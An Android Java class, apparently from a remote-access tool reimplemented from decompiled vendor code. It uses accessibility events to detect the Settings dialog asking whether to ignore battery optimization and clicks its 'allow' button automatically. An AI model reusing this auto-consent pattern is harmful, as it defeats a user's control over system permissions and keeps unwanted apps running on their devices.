package com.vendor.rat.auto.engine.support;

import android.util.Log;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.auto.filter.NodeFilter;
import com.vendor.rat.model.req.ListenWindow;

import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ScheduledExecutorService;

/**
 * 电池优化对话框处理 — 从 AutoEngine 提取
 * 对齐 vendor o/c.java J(), I(), N(), u(), Y()
 */
public class BatteryDialogHandler {

    private static final String TAG = "BatteryDialogHandler";

    /**
     * 引擎上下文接口 — 解耦 AutoEngine 依赖
     */
    public interface EngineContext {
        boolean matchListenWindows(List<ListenWindow> windows);
        UiNode getRootNode();
        ConcurrentLinkedQueue<String> getStateQueue();
        ScheduledExecutorService getScheduler();
    }

    private final EngineContext engineContext;

    public BatteryDialogHandler(EngineContext engineContext) {
        this.engineContext = engineContext;
    }

    /**
     * 构建电池优化对话框 ListenWindow
     * 对应 vendor: o/c.java J() 行 68-72
     */
    public static ListenWindow buildBatteryDialogWindow() {
        ListenWindow lw = new ListenWindow("com.android.settings", "android.app.Dialog");
        HashSet<Integer> eventTypes = new HashSet<>();
        eventTypes.add(32);    // TYPE_WINDOW_CONTENT_CHANGED
        eventTypes.add(16384); // TYPE_VIEW_SCROLLED
        lw.setEventTypes(eventTypes);
        return lw;
    }

    /**
     * 构建"允许"按钮过滤器 (OR: button1 | btn_positive)
     * 对应 vendor: o/c.java I() 行 55-66
     * ADAPT: vendor 返回 CombineFiltersWithOr, replica 返回 NodeFilter[]
     */
    public static NodeFilter[] buildBatteryAllowButtonFilters() {
        // Filter1: className=Button + id=android:id/button1
        NodeFilter filter1 = CombineFilter.and(
                StringCondition.className("android.widget.Button"),
                StringCondition.viewId("android:id/button1")
        );
        // Filter2: className=Button + id=com.android.settings:id/btn_positive
        NodeFilter filter2 = CombineFilter.and(
                StringCondition.className("android.widget.Button"),
                StringCondition.viewId("com.android.settings:id/btn_positive")
        );
        return new NodeFilter[]{filter1, filter2};
    }

    /**
     * 构建取消按钮过滤器
     * 对应 vendor: o/c.java N() 行 119-123
     */
    public static CombineFilter buildCancelButtonFilter() {
        return CombineFilter.and(
                StringCondition.className("android.widget.Button"),
                StringCondition.viewId("android:id/button1")
        );
    }

    /**
     * 检查并处理电池优化对话框
     * 对应 vendor: o/c.java u() 行 762-801
     * 在 onAccessibilityEvent 中调用
     */
    public void check() {
        try {
            ListenWindow dialogWindow = buildBatteryDialogWindow();
            if (engineContext.matchListenWindows(Collections.singletonList(dialogWindow))) {
                Log.d(TAG, "已进入是否允许忽略电池优化窗口");
                ConcurrentLinkedQueue<String> stateQueue = engineContext.getStateQueue();
                if (!stateQueue.contains("keepInBatteryUnRestricted")) {
                    stateQueue.add("keepInBatteryUnRestricted");
                    // vendor: thread.l.c(new o.a(this, 0), this.c)
                    ScheduledExecutorService scheduler = engineContext.getScheduler();
                    scheduler.execute(new Runnable() {
                        @Override
                        public void run() {
                            dismiss();
                        }
                    });
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "check error", e);
        }
    }

    /**
     * 点击电池优化对话框的"允许"按钮
     * 对应 vendor: o/a.java case 0 — 查找 android:id/button1 并点击
     */
    private void dismiss() {
        ConcurrentLinkedQueue<String> stateQueue = engineContext.getStateQueue();
        try {
            UiNode root = engineContext.getRootNode();
            if (root == null) {
                stateQueue.remove("keepInBatteryUnRestricted");
                return;
            }
            // vendor: 查找 android:id/button1 (允许按钮)
            CombineFilter filter = CombineFilter.and(
                    StringCondition.className("android.widget.Button"),
                    StringCondition.viewId("android:id/button1"));
            UiNode button = root.findOneByCombine(filter);
            if (button != null && button.click()) {
                Log.d(TAG, "已点击允许忽略电池优化");
            } else {
                Log.e(TAG, "允许忽略电池优化按钮未找到");
            }
            stateQueue.remove("keepInBatteryUnRestricted");
        } catch (Exception e) {
            Log.e(TAG, "dismiss error", e);
            stateQueue.remove("keepInBatteryUnRestricted");
        }
    }

    /**
     * 检查对话框 + 屏幕状态
     * 对应 vendor: o/c.java Y() 行 437-449
     */
    public static boolean checkAndDismissDialog() {
        try {
            // vendor c.java:439: M() — 点击取消按钮
            // vendor c.java:440-443: 检查屏幕状态
            if (com.vendor.rat.utils.MiscUtils.isScreenOn()) {
                return true;
            }
            return false;
        } catch (Exception e) {
            Log.e(TAG, "checkAndDismissDialog error", e);
            return false;
        }
    }
}
